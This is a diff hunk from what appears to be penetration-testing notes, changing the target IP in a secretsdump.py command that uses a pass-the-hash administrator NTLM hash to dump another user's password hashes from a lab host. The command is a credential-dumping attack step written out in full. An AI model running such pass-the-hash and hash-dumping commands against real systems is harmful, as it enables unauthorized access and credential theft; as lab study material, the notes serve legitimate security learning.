@@ -50,7 +50,7 @@ sometimes we might not be able to dump hashes by just specifying the user like w
 
 ```powershell
 # Dumping peterparker hash with local admin hash
-$ secretsdump.py administrator:@192.168.0.132 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
+$ secretsdump.py administrator:@192.168.0.183 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
 ```
 
 
